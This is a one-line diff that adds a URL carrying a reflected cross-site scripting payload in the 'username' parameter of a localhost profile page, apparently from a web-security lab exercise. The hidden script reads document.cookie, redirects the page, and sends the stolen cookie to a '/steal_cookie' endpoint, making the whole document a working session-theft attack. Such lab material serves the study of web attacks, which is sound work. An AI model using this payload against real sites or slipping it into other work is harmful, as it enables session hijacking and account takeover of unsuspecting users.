@@ -1,0 +1,1 @@
+http://localhost:3000/profile?username=<p hidden><script>let stolen_cookie=document.cookie; window.location.replace("http://localhost:3000/profile"); let xml_http_request = new XMLHttpRequest(); xml_http_request.open('GET', 'http://localhost:3000/steal_cookie?cookie='.concat(stolen_cookie)); xml_http_request.onload = function () {}; xml_http_request.send();</script>
